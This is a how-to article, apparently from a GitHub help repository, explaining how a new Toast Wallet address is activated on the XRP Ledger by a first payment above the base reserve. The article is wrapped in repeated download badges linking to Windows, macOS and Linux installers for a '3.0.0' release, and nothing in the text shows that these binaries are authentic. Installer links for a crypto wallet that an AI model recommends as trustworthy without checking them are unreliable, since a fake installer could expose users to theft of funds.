<p align="center"><img src="https://github.com/Toast-Wallet/learn/raw/HEAD/assets/banner-article.png" alt="Toast Wallet banner" width="100%"></p>

<h1 align="center">Activate a new Toast Wallet account</h1>

<p align="center">Fund a new address with enough XRP to meet the reserve.</p>

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

All versions and checksums are on the [Toast Wallet 3.0.0 release page](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> [!IMPORTANT]
> Only download from this GitHub release page.

---

## 💡 Short answer

A new Toast Wallet address only becomes active on the XRP Ledger when it receives at least the base reserve in XRP. Copy your new `r` address from the [latest Toast Wallet](https://github.com/Toast-Wallet/core/releases/tag/3.0.0), send it an amount above the current reserve from an exchange or another wallet, and the account appears with its balance.

## 👀 You'll see this if

- You just created an account and Toast Wallet shows no balance or says it is not activated.
- An exchange refuses to withdraw a small amount to your new address.
- You sent a tiny amount to a new address and it failed.
- You are curious why a new account is not immediately "on" the ledger.

## 🤔 Why it happens

Creating an account in Toast Wallet generates a key pair on your computer. At that moment, the address exists mathematically, but the XRP Ledger knows nothing about it. The ledger only records an account when it first receives a payment large enough to cover the base reserve. Until then, the address is valid but empty and inactive.

This is a network rule designed to keep the ledger lean. It is not a Toast Wallet limitation, and every XRP wallet experiences the same thing.

## 🧭 Before you start

Make your first backup code before you send anything to a new account, so the XRP is recoverable from the start. Then find out the current base reserve; an up-to-date wallet or the exchange's own withdrawal page usually indicates the minimum. Plan to send comfortably more than that.

## 🛠️ Fix: activate step by step

1. **Back up first.** Settings, Backup Wallet. Follow [create a new Toast Wallet backup](https://github.com/Toast-Wallet/learn/blob/main/how-to/create-new-toast-wallet-backup.md).
2. **Copy your new address.** Open the account in Toast Wallet and copy the address starting with `r`.
3. **Choose a source.** An exchange, another wallet you control or a friend can send the first XRP.
4. **Send more than the reserve.** Send an amount above the base reserve, plus some extra so the account can pay fees and send later. The reasons are explained in [Toast Wallet XRP reserve explained](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-xrp-reserve-explained.md).
5. **No destination tag is needed** for your own Toast account.
6. **Wait a few seconds.** Once confirmed, the account becomes active and the balance appears in Toast Wallet.
7. **Check the address.** Make sure the incoming payment went to the address you copied. Details on receiving are in [receive XRP in Toast Wallet](https://github.com/Toast-Wallet/learn/blob/main/how-to/receive-xrp-in-toast-wallet.md).

## 🧩 Real-world example

A new user creates their first Toast account and tries to withdraw a very small test amount from an exchange. The exchange rejects it, saying the destination is not activated. The user withdraws a larger amount above the reserve instead. It arrives within a minute, the account becomes active, and from then on small test payments work normally.

## ⚠️ Common mistakes

- Sending a tiny first payment below the reserve.
- Forgetting to make a backup code before funding the account.
- Assuming the wallet is broken when a brand-new address shows nothing.
- Paying a website to "activate" a wallet, which is never necessary.

## 🔁 If that did not work

- **The exchange still refuses.** Some exchanges have their own withdrawal minimums. Check their page and withdraw a little more.
- **The payment arrived but the balance shows zero.** See [Toast Wallet balance shows zero](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-balance-shows-zero.md).
- **You sent to the wrong address.** Payments are final. Contact the receiver if you know them.

## 🛡️ Prevention

Always back up a new account before funding it. Keep a little more than the reserve in each account so you can pay network fees. Ignore any service that charges to "activate" Toast Wallet; activation is simply the first payment.

## 📝 Good to know

Activation is a one-time event per account. Once an address is active, it stays active as long as it holds the reserve, and you can receive any amount afterwards. If you create several accounts in Toast Wallet, each one needs its own activating payment. There is usually no reason to create many accounts; one or two well-backed-up accounts are easier to manage and keep track of.

You can also activate an account by sending XRP from another of your own Toast accounts. That is convenient, but the sending account must keep its own reserve, so plan the amounts so that both accounts end up above the minimum.

## 🔍 A closer look at choosing the first amount

How much should the first payment be? Enough to cover the base reserve, plus a margin for network fees and for any XRP you plan to send later. If you are moving savings into Toast Wallet, the simplest plan is to activate the account with a modest amount, check that it arrived correctly, and then send the rest. That way, the activation payment also serves as your test.

## 🧠 Remember

A new Toast account is ready the moment it receives more than the base reserve. Back up first, copy the address, send a sensible first amount and wait a few seconds. There is nothing else to activate, nothing to pay to a third party and no form to fill in.

If you plan to use more than one account, write down which one is your main account and which ones are for specific purposes. That simple label saves confusion later, especially when restoring a backup or checking exchange withdrawal history.

## ❓ FAQ

<details>
<summary>Does activation cost a fee?</summary>

Only the usual tiny network fee for the payment. The reserve stays in your account.

</details>

<details>
<summary>Do I need to activate after restoring a backup?</summary>

No. Accounts that were already active stay active on the ledger.

</details>

<details>
<summary>Can Toast Wallet activate my account for me?</summary>

No. Activation happens when someone sends XRP to your address.

</details>

> [!WARNING]
> Anyone who asks for payment or your secret key to "activate" your Toast Wallet is running a scam.

---

## ⬇️ Download Toast Wallet 3.0.0

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

Checksums for every file are on the [official Toast Wallet 3.0.0 release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0). More guides live in the [Toast Wallet learn hub](https://github.com/Toast-Wallet/learn).

---

## 📚 Related articles

| Guide | What it covers |
|:--|:--|
| [Toast Wallet XRP reserve explained](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-xrp-reserve-explained.md) | Why part of the balance is locked by the XRP Ledger. |
| [Receive XRP in Toast Wallet](https://github.com/Toast-Wallet/learn/blob/main/how-to/receive-xrp-in-toast-wallet.md) | Share the right address and confirm the payment arrived. |
| [Create a new Toast Wallet backup](https://github.com/Toast-Wallet/learn/blob/main/how-to/create-new-toast-wallet-backup.md) | Make a fresh backup code after any change to your accounts. |
| [Toast Wallet balance shows zero](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-balance-shows-zero.md) | Reasons a balance reads zero and how to confirm your XRP. |
